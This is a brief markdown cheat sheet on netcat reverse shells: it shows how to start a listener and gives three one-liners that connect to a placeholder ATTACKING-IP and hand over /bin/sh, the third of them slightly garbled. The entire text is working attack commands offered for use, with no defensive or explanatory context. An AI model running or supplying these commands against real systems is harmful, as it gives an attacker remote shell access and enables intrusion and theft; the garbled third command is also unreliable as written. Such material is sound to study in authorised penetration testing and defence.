### Start your listner 
```
nc -lnvp 80
```
### Listner Examples
* Example one
``` 
nc -e /bin/sh ATTACKING-IP 80
```
* Example two
```
/bin/sh | nc ATTACKING-IP 80
```
* Example Three
```
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```
